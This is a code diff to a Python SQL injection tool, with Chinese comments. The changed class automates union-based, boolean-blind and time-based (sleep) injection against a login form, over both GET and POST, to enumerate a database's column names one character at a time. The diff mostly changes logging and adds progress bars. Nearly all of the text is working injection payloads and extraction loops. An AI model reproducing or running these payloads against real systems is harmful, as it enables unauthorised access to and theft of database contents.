@@ -36,259 +36,296 @@ class SqliColumns(SqliTables):
                 columns_name = []
 
                 # 开始跑columns_name
-                logger.info("Start sqli databases %s's tables %s's columns..." % (database_name, table_name))
+                logger.debug("Start sqli databases %s's tables %s's columns..." % (database_name, table_name))
 
                 # 先GET
                 if self.sqlirequest == "GET":
-                    logger.info("The sqlirequest is %s, start sqli columns..." % self.sqlirequest)
+                    logger.debug("The sqlirequest is %s, start sqli columns..." % self.sqlirequest)
 
                     if self.sqlimethod == "normal":
 
-                        logger.info("The sqlimethod is %s..." % self.sqlimethod)
-                        logger.info("Start table's %s amount sqli..." % table_name)
+                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
+                        logger.debug("Start table's %s column amount sqli..." % table_name)
 
                         # 先注columns的数量
                         payload = "user=ddog' union all SELECT 1,COUNT(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit 0,1%23&passwd=ddog123&submit=Log+In"
                         r = self.Data.GetData(payload)
                         columns_number = int(UnpackFunction(r))
-                        logger.info("Columns account sqli success...The columns_number is %d..." % columns_number)
-                        print "[*] columns_number: %d" % columns_number
+                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
+                        logger.info("[*] columns_number: %d" % columns_number)
 
                         # 每个循环跑一次columns的数据
                         for i in trange(int(columns_number), desc="Column sqli...", leave=False):
                             # 首先是column name的长度
-                            logger.info("Start %dth column length sqli..." % (i + 1))
-                            # 首先是columns name的长度
+                            logger.debug("Start %dth column length sqli..." % (i + 1))
                             payload = "user=ddog' union all SELECT 1,length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(i) + ",1%23&passwd=ddog123&submit=Log+In"
                             r = self.Data.GetData(payload)
                             column_name_len = int(UnpackFunction(r))
 
-                            logger.info("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
-                            tqdm.write("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
+                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
+                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
 
                             # 然后注columns name
                             payload = "user=ddog' union all SELECT 1,column_name from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(i) + ",1%23&passwd=ddog123&submit=Log+In"
                             r = self.Data.GetData(payload)
                             column_name = UnpackFunction(r)
-                            logger.info("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
+                            logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
 
                             # 把columns_name插入列表
                             columns_name.append(column_name)
-                            tqdm.write("[*] %dth column_name: %s" % ((i + 1), column_name))
+                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))
 
                     elif self.sqlimethod == "build":
 
-                        logger.info("The sqlimethod is %s..." % self.sqlimethod)
-                        for i in range(0, 100):
+                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
+                        logger.debug("Start table's %s column amount sqli..." % table_name)
+
+                        for i in trange(100, desc='Column amount sqli', leave=False):
                             # 先注columns的数量
-                            payload = "username=admi' or SElECT ((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit 0,1) > " + repr(
-                                i) + ")%23&passwd=ddog123&submit=Log+In"
+                            payload = "user=user1' %26%26 (SElECT ((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit 0,1) > " + repr(
+                                i) + "))%23&passwd=ddog123&submit=Log+In"
                             if self.Data.GetBuildData(payload, self.len) == 0:
                                 columns_number = i
                                 break
 
-                        logger.info("Columns amount sqli success...The columns_number is %d..." % columns_number)
-                        print "[*] columns_number: %d" % columns_number
+                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
+                        logger.info("[*] columns_number: %d" % columns_number)
 
                         for i in range(0, int(columns_number)):
-                            # 然后注columns_name 的 length
-                            for j in range(0, 30):
-                                payload = "username=admi' or select ((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
-                                    i) + ",1) > " + repr(j) + ")%23&passwd=ddog123&submit=Log+In"
+                            # 然后注 columns_number 的 length
+                            logger.debug("Start %dth column length sqli..." % (i + 1))
+                            for j in trange(30, desc="%dth Column length sqli..." % (i + 1), leave=False):
+                                payload = "user=user1' %26%26 (select ((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(
+                                    i) + ",1) > " + repr(j) + "))%23&passwd=ddog123&submit=Log+In"
                                 if self.Data.GetBuildData(payload, self.len) == 0:
-                                    columns_name_len = j
+                                    column_name_len = j
                                     break
 
-                            logger.info("Columns name length sqli success...The columns_name_len is %d..." % columns_name_len)
-                            print "[*] columns_name_len: %d" % columns_name_len
+                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
+                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
 
-                            # 然后注columns名字
-                            for j in range(0, int(columns_name_len)):
-                                for k in range(30, 130):
-                                    payload = "username=admi' or select (SELECT ascii(substring(column_name," + repr(
-                                        j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
-                                        i) + ",1) >" + repr(k) + "))%23&passwd=ddog123&submit=Log+In"
+                            # 然后注column名字
+                            # 清空column_name
+                            column_name = ""
+                            logger.debug("Start %dth column sqli..." % (i + 1))
+                            for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
+                                for k in trange(100, desc='%dth Column\'s %dth char sqli' % ((i + 1), (j + 1)),
+                                                leave=False):
+                                    payload = "user=user1' %26%26 (select ((SELECT ascii(substring(column_name," + repr(
+                                        j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(
+                                        i) + ",1) >" + repr(k + 30) + "))%23&passwd=ddog123&submit=Log+In"
                                     if self.Data.GetBuildData(payload, self.len) == 0:
-                                        columns_name += chr(int(k))
+                                        column_name += chr(int(k + 30))
                                         break
 
-                            logger.info("Columns name sqli success...The columns_name is %d..." % columns_name)
+                            logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
+
                             # 把columns_name插入列表
-                            self.columns_name[i].append(columns_name)
-                            print "[*] columns_name:" + columns_name
+                            columns_name.append(column_name)
+                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))
 
                     elif self.sqlimethod == "time":
 
-                        logger.info("The sqlimethod is %s..." % self.sqlimethod)
-                        for i in range(0, 100):
+                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
+                        logger.debug("Start table's %s column amount sqli..." % table_name)
+
+                        for i in trange(100, desc='Column amount sqli', leave=False):
 
                             # 先注columns的数量
-                            payload = "username=admi' or SELECT if((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit 0,1) > " + repr(
-                                i) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"
+                            payload = "user=ddog' union SELECT 1,if((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit 0,1) > " + repr(
+                                i) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
                             if self.Data.GetTimeData(payload, self.time) == 0:
                                 columns_number = i
                                 break
 
-                        logger.info("Columns amount sqli success...The columns_number is %d..." % columns_number)
-                        print "[*] columns_number: %d" % columns_number
+                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
+                        logger.info("[*] columns_number: %d" % columns_number)
 
                         for i in range(0, int(columns_number)):
-                            # 然后注columns_number 的length
-                            for j in range(0, 30):
-                                payload = "username=admi' or SELECT if((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
-                                    i) + ",1) > " + repr(j) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"
+                            # 然后注 columns_number 的 length
+                            logger.debug("Start %dth column length sqli..." % (i + 1))
+                            for j in trange(30, desc="%dth Column length sqli..." % (i + 1), leave=False):
+                                payload = "user=ddog' union SELECT 1,if((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(
+                                    i) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
 
                                 if self.Data.GetTimeData(payload, self.time) == 0:
-                                    columns_name_len = j
+                                    column_name_len = j
                                     break
 
-                            logger.info("Columns name length sqli success...The columns_name_len is %d..." % columns_name_len)
-                            print "[*] columns_name_len: %d" % columns_name_len
+                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
+                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
 
                             # 然后注columns名字
-                            for j in range(0, int(columns_name_len)):
-                                for k in range(30, 130):
-                                    payload = "username=admi' or SELECT if((SELECT  ascii(substring(column_name," + repr(
-                                        j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
-                                        i) + ",1) > " + repr(k) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"
+                            # 清空column_name
+                            column_name = ""
+                            logger.debug("Start %dth column sqli..." % (i + 1))
+                            for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
+                                for k in trange(100, desc='%dth Column\'s %dth char sqli' % ((i + 1), (j + 1)),
+                                                leave=False):
+                                    payload = "user=ddog' union SELECT 1,if((SELECT  ascii(substring(column_name," + repr(
+                                        j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + table_name + "' %26%26 table_schema = '" + database_name + "' limit " + repr(
+                                        i) + ",1) > " + repr(k + 30) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
 
                                     if self.Data.GetTimeData(payload, self.time) == 0:
-                                        columns_name += chr(int(k))
+                                        column_name += chr(int(k + 30))
                                         break
 
-                            logger.info("Columns name sqli success...The columns_name is %d..." % columns_name)
+                            logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
+
                             # 把columns_name插入列表
-                            self.columns_name[i].append(columns_name)
-                            print "[*] columns_name:" + columns_name
+                            columns_name.append(column_name)
+                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))
 
                 # 然后是post
                 elif self.sqlirequest == "POST":
-                    logger.info("The sqlirequest is %s, start sqli tables..." % self.sqlirequest)
+                    logger.debug("The sqlirequest is %s, start sqli tables..." % self.sqlirequest)
 
                     if self.sqlimethod == "normal":
 
-                        logger.info("The sqlimethod is %s..." % self.sqlimethod)
+                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
+                        logger.debug("Start table's %s column amount sqli..." % table_name)
+
                         # 先注columns的数量
                         payload = {
-                            "username": "admi' or SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit 0,1%23",
+                            "user": "admi' union all SELECT 1,COUNT(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit 0,1#",
                             "passwd": "ddog123"}
                         r = self.Data.PostData(payload)
                         columns_number = int(UnpackFunction(r))
-                        logger.info("Columns account sqli success...The columns_number is %d..." % columns_number)
-                        print "[*] columns_number: %d" % columns_number
+                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
+                        logger.info("[*] columns_number: %d" % columns_number)
 
                         # 每个循环跑一次columns的数据
-                        for i in range(0, int(columns_number)):
-                            # 首先是tablename的长度
+                        for i in trange(int(columns_number), desc="Column sqli...", leave=False):
+
+                            # 首先是column name的长度
+                            logger.debug("Start %dth column length sqli..." % (i + 1))
                             payload = {
-                                "username": "a' or SELECT length(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
-                                    i) + ",1%23", "passwd": "ddog123&submit=Log+In"}
+                                "user": "ddog' union all SELECT 1,length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
+                                    i) + ",1#", "passwd": "ddog123&submit=Log+In"}
                             r = self.Data.PostData(payload)
-                            columns_name_len = int(UnpackFunction(r))
-                            logger.info("Columns name length sqli success...The columns_name_len is %d..." % columns_name_len)
-                            print "[*] columns_name_len: %d" % columns_name_len
+                            column_name_len = int(UnpackFunction(r))
+
+                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
+                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
 
                             # 然后注columns_name
                             payload = {
-                                "username": "ad' or SELECT column_name from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
-                                    i) + ",1)%23", "passwd": "ddog123"}
+                                "user": "ddog' union all SELECT 1,column_name from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
+                                    i) + ",1#", "passwd": "ddog123"}
                             r = self.Data.PostData(payload)
-                            columns_name = UnpackFunction(r)
-                            logger.info("Columns name sqli success...The tables_name_len is %d..." % tables_name)
+                            column_name = UnpackFunction(r)
+                            logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
+
                             # 把columns_name插入列表
-                            self.columns_name[i].append(columns_name)
-                            print "[*] columns_name: %s" % columns_name
+                            columns_name.append(column_name)
+                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))
 
                     elif self.sqlimethod == "build":
 
-                        logger.info("The sqlimethod is %s..." % self.sqlimethod)
-                        for i in range(0, 100):
+                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
+                        logger.debug("Start table's %s column amount sqli..." % table_name)
+
+                        for i in trange(100, desc='Column amount sqli', leave=False):
                             # 先注columns的数量
                             payload = {
-                                "username": "admi' or SElECT ((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit 0,1) > " + repr(
-                                    i) + ")%23", "passwd": "ddog123"}
+                                "user": "user1' && (SElECT ((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit 0,1) > " + repr(
+                                    i) + "))#", "passwd": "ddog123"}
                             if self.Data.PostBuildData(payload, self.len) == 0:
                                 columns_number = i
                                 break
 
-                        logger.info("Columns amount sqli success...The columns_number is %d..." % columns_number)
-                        print "[*] columns_number: %d" % columns_number
+                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
+                        logger.info("[*] columns_number: %d" % columns_number)
 
                         for i in range(0, int(columns_number)):
-                            # 然后注columns_name 的 length
-                            for j in range(0, 30):
+                            # 然后注 columns_number 的 length
+                            logger.debug("Start %dth column length sqli..." % (i + 1))
+                            for j in trange(30, desc="%dth Column length sqli..." % (i + 1), leave=False):
                                 payload = {
-                                    "username": "admi' or select ((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
-                                        i) + ",1) > " + repr(j) + ")%23", "passwd": "ddog123"}
+                                    "user": "user1' && (select ((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
+                                        i) + ",1) > " + repr(j) + "))#", "passwd": "ddog123"}
                                 if self.Data.PostBuildData(payload, self.len) == 0:
-                                    columns_name_len = j
+                                    column_name_len = j
                                     break
 
-                            logger.info("Columns name length sqli success...The columns_name_len is %d..." % columns_name_len)
-                            print "[*] columns_name_len: %d" % columns_name_len
+                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
+                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
 
                             # 然后注columns名字
-                            for j in range(0, int(columns_name_len)):
-                                for k in range(30, 130):
-                                    payload = {"username": "admi' or select (SELECT ascii(substring(column_name," + repr(
-                                        j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
-                                        i) + ",1) >" + repr(k) + "))%23", "passwd": "ddog123"}
+                            # 清空column_name
+                            column_name = ""
+                            logger.debug("Start %dth column sqli..." % (i + 1))
+                            for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
+                                for k in trange(100, desc='%dth Column\'s %dth char sqli' % ((i + 1), (j + 1)),
+                                                leave=False):
+                                    payload = {"user": "user1' && (select ((SELECT ascii(substring(column_name," + repr(
+                                        j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
+                                        i) + ",1) >" + repr(k + 30) + "))#", "passwd": "ddog123"}
                                     if self.Data.PostBuildData(payload, self.len) == 0:
-                                        columns_name += chr(int(k))
+                                        column_name += chr(int(k + 30))
                                         break
 
-                            logger.info("Columns name sqli success...The columns_name is %d..." % columns_name)
+                            logger.debug(
+                                "%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
+
                             # 把columns_name插入列表
-                            self.columns_name[i].append(columns_name)
-                            print "[*] columns_name:" + columns_name
+                            columns_name.append(column_name)
+                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))
 
                     elif self.sqlimethod == "time":
 
-                        logger.info("The sqlimethod is %s..." % self.sqlimethod)
-                        for i in range(0, 100):
+                        logger.debug("The sqlimethod is %s..." % self.sqlimethod)
+                        logger.debug("Start table's %s column amount sqli..." % table_name)
 
+                        for i in trange(100, desc='Column amount sqli', leave=False):
                             # 先注columns的数量
                             payload = {
-                                "username": "admi' or SELECT if((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit 0,1) > " + repr(
-                                    i) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}
+                                "user": "admi' union SELECT 1,if((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit 0,1) > " + repr(
+                                    i) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
                             if self.Data.PostTimeData(payload, self.time) == 0:
                                 columns_number = i
                                 break
 
-                        logger.info("Columns amount sqli success...The columns_number is %d..." % columns_number)
-                        print "[*] columns_number: %d" % columns_number
+                        logger.debug("Columns account sqli success...The columns_number is %d..." % columns_number)
+                        logger.info("[*] columns_number: %d" % columns_number)
 
                         for i in range(0, int(columns_number)):
-                            # 然后注columns_name 的length
-                            for j in range(0, 30):
+                            # 然后注 columns_number 的 length
+                            logger.debug("Start %dth column length sqli..." % (i + 1))
+                            for j in trange(30, desc="%dth Column length sqli..." % (i + 1), leave=False):
                                 payload = {
-                                    "username": "admi' or SELECT if((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
-                                        i) + ",1) > " + repr(j) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}
+                                    "user": "admi' union SELECT 1,if((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
+                                        i) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
 
                                 if self.Data.PostTimeData(payload, self.time) == 0:
-                                    columns_name_len = j
+                                    column_name_len = j
                                     break
 
-                            logger.info("Columns name length sqli success...The database_len is %d..." % columns_name_len)
-                            print "[*] columns_name_len: %d" % columns_name_len
+                            logger.debug("%dth Column name length sqli success...The column_name_len is %d..." % ((i + 1), column_name_len))
+                            logger.info("[*] %dth column_name_len: %d" % ((i + 1), column_name_len))
 
                             # 然后注columns名字
-                            for j in range(0, int(columns_name_len)):
-                                for k in range(30, 130):
-                                    payload = {"username": "admi' or SELECT if((SELECT  ascii(substring(column_name," + repr(
-                                        j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
-                                        i) + ",1) > " + repr(k) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}
+                            # 清空column_name
+                            column_name = ""
+                            logger.debug("Start %dth column sqli..." % (i + 1))
+                            for j in trange(int(column_name_len), desc='%dth Column sqli' % (i + 1), leave=False):
+                                for k in trange(100, desc='%dth Column\'s %dth char sqli' % ((i + 1), (j + 1)),
+                                                leave=False):
+                                    payload = {"user": "admi' union SELECT 1,if((SELECT  ascii(substring(column_name," + repr(
+                                        j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + table_name + "' && table_schema = '" + database_name + "' limit " + repr(
+                                        i) + ",1) > " + repr(k + 30) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
 
                                     if self.Data.PostTimeData(payload, self.time) == 0:
-                                        columns_name += chr(int(k))
+                                        column_name += chr(int(k + 30))
                                         break
 
-                            logger.info("Columns name sqli success...The columns_name is %d..." % columns_name)
+                            logger.debug("%dth Column name sqli success...The column_name is %s..." % ((i + 1), column_name))
+
                             # 把columns_name插入列表
-                            self.columns_name[i].append(columns_name)
-                            print "[*] columns_name:" + columns_name
+                            columns_name.append(column_name)
+                            logger.info("[*] %dth column_name: %s" % ((i + 1), column_name))
 
                 # 把注入得到的columns_name列表转为元组
                 self.columns_name[database_name][table_name] = tuple(columns_name)
 
-        print "[*] columns_name list: ", self.columns_name
+        logger.info("[*] columns_name list: ", self.columns_name)
